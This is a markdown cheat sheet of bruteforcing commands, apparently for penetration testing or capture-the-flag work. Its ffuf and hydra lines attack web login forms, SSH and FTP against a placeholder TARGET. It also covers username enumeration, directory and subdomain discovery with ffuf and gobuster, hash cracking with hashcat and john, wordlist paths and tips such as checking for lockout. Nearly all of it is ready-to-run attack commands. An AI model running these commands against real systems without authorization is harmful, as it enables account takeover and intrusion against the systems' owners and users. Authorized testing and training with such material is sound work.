# Bruteforcing Cheatsheet

## Web Login (POST form)

```bash
# ffuf - username + password bruteforce
ffuf -w usernames.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 \
  -u http://TARGET/login \
  -X POST -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200

# hydra - HTTP POST
hydra -L usernames.txt -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# hydra - HTTP GET (basic auth)
hydra -L usernames.txt -P passwords.txt TARGET http-get /path
```

## Username Enumeration

```bash
# ffuf - find valid usernames via response size/code difference
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
  -u http://TARGET/login \
  -X POST -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 3260
```

## SSH Bruteforce

```bash
hydra -l username -P passwords.txt ssh://TARGET
hydra -L usernames.txt -P passwords.txt ssh://TARGET -t 4
```

## FTP Bruteforce

```bash
hydra -l username -P passwords.txt ftp://TARGET
```

## Directory / Content Discovery

```bash
# ffuf
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://TARGET/FUZZ

# gobuster
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# with extensions
gobuster dir -u http://TARGET -w wordlist.txt -x php,txt,html
```

## Subdomain Enumeration

```bash
# ffuf
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://TARGET -H "Host: FUZZ.TARGET" -fs <baseline_size>

# gobuster
gobuster dns -d TARGET -w subdomains.txt
```

## Hash Cracking

```bash
# hashcat - MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# hashcat - SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# online
# https://crackstation.net/
```

## Wordlists

| Purpose | Path |
|---|---|
| Passwords | `/usr/share/wordlists/rockyou.txt` |
| Common passwords | `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt` |
| Usernames | `/usr/share/wordlists/SecLists/Usernames/Names/names.txt` |
| Directories | `/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt` |
| Subdomains | `/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` |

## Tips

- Use `-fc 200` in ffuf to filter out responses with status 200 (failed logins often return 200)
- Use `-fs <size>` to filter by response size when status codes are the same
- `hydra -t 4` limits threads for SSH (avoids lockouts)
- Always check if there's account lockout before bruteforcing
- Cookie/session values may be base64 encoded — decode with `echo "value" | base64 -d`
- Hashed cookies can be looked up at crackstation.net
